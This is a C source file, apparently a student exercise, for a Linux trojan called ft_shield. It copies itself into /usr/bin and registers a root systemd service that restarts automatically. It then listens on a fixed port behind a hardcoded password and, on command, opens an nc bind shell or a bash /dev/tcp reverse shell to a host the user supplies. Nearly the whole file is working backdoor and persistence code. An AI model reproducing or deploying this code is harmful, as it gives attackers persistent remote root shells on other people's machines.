#include "../include/ft_shield.h"

#define SERVICE_FILE_CONTENT	"[Unit]\n"\
                            	"Description=ft_shield trojan\n"\
                            	"\n"\
                            	"[Service]\n"\
                            	"User=root\n"\
                            	"Restart=always\n"\
                            	"RestartSec=5s\n"\
                            	"ExecStart=/usr/bin/ft_shield\n"\
                            	"WorkingDirectory=/\n"\
                            	"StandardOutput=file:/var/log/ft_shield.log\n"\
                            	"StandardError=file:/var/log/ft_shield_error.log\n"\
                            	"\n"\
                            	"[Install]\n"\
                            	"WantedBy=multi-user.target\n"
#define FT_SHIELD_COMMANDS	"Commands:\n"\
							"   help - ?                                :     Shows this help message\n"\
							"   exit                                    :     Close current client connection\n"\
							"   shell                                   :     Create a remote shell connection\n"\
							"   reverse <IPV4 ADDRESS> <PORT>           :     Create a reverse shell connection\n"\
							"   send <IPV4 ADDRESS> <PORT> <FILE PATH>  :     Send a file from the target machine\n"\
							"   receive <FILE PATH>                     :     Receive a file in the target machine\n"\
							"\n"\
							"INFO:\n"\
							"   reverse: Create a reverse shell connection to the specified IPV4 address and port.\n"\
							"            Usage: reverse <IPV4 ADDRESS> <PORT>\n"\
							"            Note: Ensure that the target machine is listening on the specified port.\n"\
							"\n"\
							"   send: Send a file from the target machine to the specified IPV4 address and port.\n"\
							"         Usage: send <IPV4 ADDRESS> <PORT> <FILE PATH>\n"\
							"         Note: Ensure that the receiving machine is listening on the specified port.\n"\
							"\n"\
							"   receive: Receive a file in the target machine from a remote machine.\n"\
							"            Usage: receive <FILE PATH>\n"\
							"            Note: Ensure that the sending machine is connected and sending the file.\n"
#define	COMMAND_NOT_FOUND	"ft_shield $> Command not found. use 'help' to get the help menu\n"
#define	MAX_CLIENT_CONNECTION_COUNT	3
#define	SERVER_PORT	4242
#define	PASSWORD	"1234"

typedef	struct	client_info
{
	bool	is_logged;
	bool	in_shell;
	pid_t	shell_pid;
	int		password_try_count;
}			t_client_info;

typedef	struct	server
{
	int				client_count;
	int				server_sock;
	struct	pollfd	clients[MAX_CLIENT_CONNECTION_COUNT + 1];
	t_client_info	clients_info[MAX_CLIENT_CONNECTION_COUNT + 1];
}				t_server;

t_server	*g_server;

void	send_msg_to_client(char *msg, int fd);

void	ft_error(char *str)
{
	write(2, str, strlen(str));
	// exit(1);
}

void	handle_signal(int sig)
{
	if (sig == SIGTERM)
		return;
}

void	sigchld_handler(int sig)
{
	(void)sig;
	int		status;
	pid_t	pid;

	while ((pid = waitpid(-1, &status, WNOHANG)) > 0)
	{
		for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
		{
			if (g_server->clients_info[i].shell_pid != pid)
				continue;
			g_server->clients_info[i].in_shell = false;
			g_server->clients_info[i].shell_pid = -1;
			send_msg_to_client("Shell closed. Returning to server...\n", g_server->clients[i].fd);
			send_msg_to_client("ft_shield $> HAHAHA", g_server->clients[i].fd);
			break;
		}
	}
}

void	setup_signals(void)
{
	struct sigaction sa;

	sa.sa_handler = handle_signal;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;
	if (sigaction(SIGTERM, &sa, NULL) < 0)
		ft_error("sigaction");
	sa.sa_handler = sigchld_handler;
	sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
	if (sigaction(SIGCHLD, &sa, NULL) < 0)
		ft_error("sigaction");
	return;
}

bool	is_bin(void)
{
	char	path[PATH_MAX], rpath[PATH_MAX];
	ssize_t	len;

	len = readlink("/proc/self/exe", path, sizeof(path)-1);
	if (len == -1)
		ft_error("readlink");
	if (!realpath(path, rpath))
		ft_error("realpath");
	if (strcmp("/usr/bin", dirname(rpath)))
		return false;
	return true;
}

void	create_daemon(void)
{
	int		fd;
	pid_t	pid = fork();

	if (pid < 0)
		ft_error("fork");
	if (pid)
		exit(0);
	if (setsid() < 0)
		ft_error("setsid");
	if (chdir("/") < 0)
		ft_error("chdir");
	umask(0);
	fd = open("/var/log/ft_shield_debug.log", O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd < 0)
		ft_error("open");
	if (dup2(fd, STDIN_FILENO) < 0)
		ft_error("dup stdin");
	if (dup2(fd, STDOUT_FILENO) < 0)
		ft_error("dup stdout");
	if (dup2(fd, STDERR_FILENO) < 0)
		ft_error("dup stderr");
	if (close(fd) < 0)
		ft_error("close fd");
	return ;
}

void	move_to_target(void)
{
	if (!access("/usr/bin/ft_shield", F_OK))
	{
		// I need to check the checksum of the binary to see if the same binary or not
		return;
	}
	char	bin_path[PATH_MAX], buff[4096];
	ssize_t	len = readlink("/proc/self/exe", bin_path, sizeof(bin_path)-1);
	int		src_fd, dst_fd, read_count, write_count;
	if (len == -1)
		ft_error("readlink");
	bin_path[len] = 0;
	printf("%s\n", bin_path);
	src_fd = open(bin_path, O_RDONLY);
	if (src_fd < 0)
		ft_error("open src");
	dst_fd = open("/usr/bin/ft_shield", O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (dst_fd < 0)
		ft_error("open dst");
	while ((read_count = read(src_fd, buff, sizeof(buff))) > 0)
	{
		write_count = write(dst_fd, buff, read_count);
		if (read_count != write_count)
		{
			close(src_fd);
			close(dst_fd);
			ft_error("write");
		}
	}
	close(src_fd);
	close(dst_fd);
	if (read_count < 0)
		ft_error("read");
	return;
}

void	config_service(void)
{
	if (!access("/etc/systemd/system/ft_shield.service", F_OK))
	{
		// I need to check the checksum of the service file to see if the same service we want or not
		return;
	}
	int	fd = open("/etc/systemd/system/ft_shield.service", O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (fd < 0)
		ft_error("open");
	if (write(fd, SERVICE_FILE_CONTENT, strlen(SERVICE_FILE_CONTENT)) < 0)
	{
		close(fd);
		ft_error("write");
	}
	close(fd);
	if (system("systemctl daemon-reload"))
		ft_error("system");
	if (system("systemctl enable ft_shield"))
		ft_error("system");
	if (system("systemctl start ft_shield"))
		ft_error("system");
	return;
}

int		init_server()
{
	int		server_sock, opt = 1;
	struct	sockaddr_in	addr = {0};

	if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		ft_error("socket");
	if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
	{
		close(server_sock);
		ft_error("setsockopt");
	}
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(SERVER_PORT);
	if (bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		close(server_sock);
		ft_error("bind");
	}
	if (listen(server_sock, MAX_CLIENT_CONNECTION_COUNT) < 0)
	{
		close(server_sock);
		ft_error("listen");
	}
	return (server_sock);
}

void	clear_client_connection(int fd)
{
	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT; i++)
	{
		if (g_server->clients[i].fd != fd)
			continue;
		send_msg_to_client("HAHAHAHHAHA...\n", g_server->clients[i].fd);
		shutdown(fd, SHUT_RDWR);
		close(fd);
		g_server->clients[i].fd = -1;
		g_server->clients[i].events = POLLIN;
		g_server->clients[i].revents = 0;
		g_server->clients_info[i].is_logged = false;
		g_server->clients_info[i].password_try_count = 0;
		g_server->client_count--;
		return;
	}
}

void	send_msg_to_client(char *msg, int fd)
{
	if (send(fd, msg, strlen(msg), 0) < 0)
	{
		clear_client_connection(fd);
		ft_error("send");
	}
}

char	*trim_whitespaces(char *buff)
{
	if (!buff)
		return NULL;
	int	first_byte = 0, end_byte;
	while (isspace(buff[first_byte]))
		first_byte++;
	if (!buff[first_byte])
	{
		buff[0] = 0;
		return (buff);
	}
	end_byte = strlen(buff)-1;
	while (end_byte > first_byte && isspace(buff[end_byte]))
		end_byte--;
	buff[end_byte+1] = 0;
	return (&buff[first_byte]);
}

void	create_remote_shell_session(int fd)
{
	send_msg_to_client("Creating a remote shell connection ...\n", fd);
	pid_t	pid = fork();
	if (pid < 0)
	{
		send_msg_to_client("Failed to create remote shell connection.\n", fd);
		return;
	}
	if (!pid)
	{
		// close(g_server->server_sock);
		// if (0 > dup2(fd, 0) || 0 > dup2(fd, 1) || 0 > dup2(fd, 2)) {
		// 	send_msg_to_client("Error creating reverse shell\n", fd);
		// 	ft_error("dup2");
		// }
		char *argv[] = {"nc", "-l", "-p", "4040", "-e", "/bin/bash", NULL};
		execv("/usr/bin/nc", argv);
		send_msg_to_client("Failed to execute remote shell\n", fd);
		// ft_error("execv");
		exit(1);
		// execl("/bin/bash", "/bin/bash", "-i", NULL);
		// send_msg_to_client("Failed to create remote shell connection.\n", fd);
	}
	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
	{
		if (g_server->clients[i].fd != fd)
			continue;
		g_server->clients_info[i].in_shell = true;
		g_server->clients_info[i].shell_pid = pid;
		break;
	}
}

void	create_reverse_shell_connection(int fd, char *user_input)
{
	char	ipv4_address[16] = {0};
	char	port[6] = {0};
	char	cmd[10] = {0};
	struct	sockaddr_in	sa = {0};

	if (sscanf(user_input, "%s %15s %5s", cmd, ipv4_address, port) != 3)
	{
		send_msg_to_client("Error: Invalid Arguments\n", fd);
		send_msg_to_client("Usage: reverse <IPV4 ADDRESS> <PORT>\n", fd);
		return;
	}
	if (inet_pton(AF_INET, ipv4_address, &(sa.sin_addr)) != 1)
	{
		send_msg_to_client("Error: Invalid IPV4 address\n", fd);
		return;
	}
	if (atoi(port) < 1024 || atoi(port) > 65535)
	{
		send_msg_to_client("Error: Invalid PORT\n", fd);
		return;
	}
	pid_t	pid = fork();
	if (pid < 0)
	{
		send_msg_to_client("Failed to create reverese shell connection\n", fd);
		return;
	}
	if (!pid)
	{
		close(g_server->server_sock);
		char	bash_cmd[128];
		snprintf(bash_cmd, sizeof(bash_cmd), "/bin/bash -i >& /dev/tcp/%s/%s 0>&1", ipv4_address, port);
		char	*argv[] = {"/bin/bash", "-c", bash_cmd, NULL};
		execv("/bin/bash", argv);
		send_msg_to_client("Failed to create reverese shell connection\n", fd);
		ft_error("execv");
	}
	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
	{
		if (g_server->clients[i].fd != fd)
			continue;
		g_server->clients_info[i].in_shell = true;
		g_server->clients_info[i].shell_pid = pid;
		break;
	}
}

void	handle_client_commands(int fd, char *cmd)
{
	char	*user_input = trim_whitespaces(cmd);

	if (!strcmp(user_input, "help") || !strcmp(user_input, "?"))
		send_msg_to_client(FT_SHIELD_COMMANDS, fd);
	else if (!strcmp(user_input, "exit"))
	{
		send_msg_to_client("WOWOWOWO...\n", fd);
		clear_client_connection(fd);
	}
	else if (!strcmp(user_input, "shell"))
		create_remote_shell_session(fd);
	else if (!strcmp(user_input, "reverse"))
		create_reverse_shell_connection(fd, user_input);
	else
		send_msg_to_client(COMMAND_NOT_FOUND, fd);
	// else if (!strcmp(user_input, "send"))
	// 	send_file_to_client(fd, user_input);
	// else if (!strcmp(user_input, "receive"))
	// 	recv_file_from_client(fd, user_input);
	return;
}

void	recv_msg_from_client(int idx)
{
	char	buff[1024];
	int		len = 0, client_fd = g_server->clients[idx].fd;

	len = recv(client_fd, buff, sizeof(buff), 0);
	if (len <= 0)
	{
		clear_client_connection(client_fd);
		ft_error("recv");
	}
	buff[len-1] = 0;
	if (!g_server->clients_info[idx].is_logged)
	{
		if (!strcmp(PASSWORD, buff))
		{
			g_server->clients_info[idx].is_logged = true;
			g_server->clients_info[idx].password_try_count = 0;
			send_msg_to_client("ft_shield $> ", client_fd);
		}
		else
		{
			g_server->clients_info[idx].password_try_count++;
			if (g_server->clients_info[idx].password_try_count < 3)
				send_msg_to_client("Wrong Password. Try again: ", client_fd);
			else
			{
				send_msg_to_client("Too many failed attempts. Disconnecting...\n", client_fd);
				clear_client_connection(client_fd);
			}
		}
		return;
	}
	if (!g_server->clients_info[idx].in_shell)
		handle_client_commands(client_fd, buff);
	if (!g_server->clients_info[idx].in_shell)
		send_msg_to_client("ft_shield $> ", client_fd);
	return;
}

void	client_connection()
{
	int					client_fd;
	socklen_t			client_len;
	struct	sockaddr_in	client_addr = {0};

	if ((client_fd = accept(g_server->server_sock, (struct sockaddr *)&client_addr, &client_len)) < 0)
		ft_error("accept");
	if (g_server->client_count == 3)
	{
		send_msg_to_client("Error: Failed to connect to remote trojan!\n", client_fd);
		shutdown(client_fd, SHUT_RDWR);
		close(client_fd);
		return;
	}
	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
	{
		if (g_server->clients[i].fd != -1)
			continue;
		g_server->clients[i].fd = client_fd;
		g_server->clients[i].events = POLLIN;
		g_server->client_count++;
		break;
	}
	send_msg_to_client("Please enter your password: ", client_fd);
}

void	run_server(void)
{
	int	poll_count;

	while (true)
	{
		poll_count = poll(g_server->clients, g_server->client_count+1, 5000);
		if (poll_count == 0)
			continue;
		if (poll_count < 0)
		{
			for (int i = 0; i < g_server->client_count; i++)
				clear_client_connection(g_server->clients[i].fd);
			continue;
		}
		for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
		{
			if (g_server->clients[i].fd == -1)
				continue;
			if (g_server->clients[i].revents & POLLIN)
			{
				if (g_server->clients[i].fd == g_server->server_sock)
					client_connection();
				else
					recv_msg_from_client(i);
			}
		}
	}
}

void	spawn_server(void)
{
	g_server = (t_server*)calloc(1, sizeof(t_server));

	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
	{
		g_server->clients[i].fd = -1;
		g_server->clients[i].events = POLLIN;
		g_server->clients[i].revents = 0;
		g_server->clients_info[i].is_logged = false;
		g_server->clients_info[i].password_try_count = 0;
	}
	g_server->server_sock = init_server();
	g_server->clients[0].fd = g_server->server_sock;
	run_server();
}

int	main()
{
	if (getegid())
		ft_error(SUDO);
	printf("%s", LOGINS);
	setup_signals();
	if (is_bin())
	{
		write(1, "I'm in /bin\n", 12);
		spawn_server();
	}
	else
	{
		write(1, "I'm not in /bin\n", 16);
		create_daemon();
		move_to_target();
		config_service();
	}
}